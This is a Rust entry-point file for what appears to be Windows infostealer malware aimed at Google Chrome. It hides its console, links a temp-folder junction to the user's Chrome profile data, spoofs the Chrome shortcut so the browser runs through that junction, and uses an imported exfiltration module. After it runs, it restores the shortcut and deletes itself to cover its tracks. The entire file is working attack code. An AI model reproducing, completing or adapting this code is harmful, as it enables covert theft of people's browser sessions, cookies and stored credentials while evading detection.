#![cfg_attr(not(feature = "debug"), windows_subsystem = "windows")] // only remove the console popup if not debugged

use std::fs;
use std::env;
use std::path::PathBuf;

mod shortcut;
use shortcut::{spoof_lnk, restore_lnk};

mod browser;
use selfdeletion;

mod exfil;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    #[cfg(feature = "debug")]
    println!("[*] Retreaving username...");
    let username = env::var("USERNAME")?;

    let junc_path: PathBuf = PathBuf::from(format!("C:\\temp\\{}", username));

    let chrome_data_path: PathBuf = PathBuf::from(&format!("C:\\Users\\{}\\AppData\\Local\\Google\\Chrome\\User Data", username));

    #[cfg(feature = "debug")]
    println!("[*] Checking if junction exists...");
    if !junction::exists(&junc_path)? {
        #[cfg(feature = "debug")]
        println!("[*] Creating dir junction...");
        junction::create(chrome_data_path, &junc_path)?;

        #[cfg(feature = "debug")]
        println!("[*] Spoofing Chrome shortcut...");
        let _ = spoof_lnk(&username)?;

    } else {
        #[cfg(feature = "debug")]
        println!("[*] Starting browser...");
        match browser::run_browser(&junc_path).await {
            Ok(delete_self) => {
                if delete_self {
                    #[cfg(feature = "debug")]
                    println!("[*] Removing junction and dir...");
                    junction::delete(&junc_path)?;
                    fs::remove_dir(&junc_path)?;

                    #[cfg(feature = "debug")]
                    println!("[*] Restoring Chrome shortcut...");
                    let _ = restore_lnk(username)?;

                    #[cfg(feature = "debug")]
                    println!("[*] Deleting self...");
                    let _ = selfdeletion::delete_self();
                }
            }
            Err(_e) => {
                #[cfg(feature = "debug")]
                println!("[!] An error occurred: {}", _e);
            }
        }

        #[cfg(feature = "debug")] {
            println!("[?] Press Enter to exit...");
            let mut input = String::new();
            std::io::stdin().read_line(&mut input).unwrap();
        }
    }

    Ok(())
}
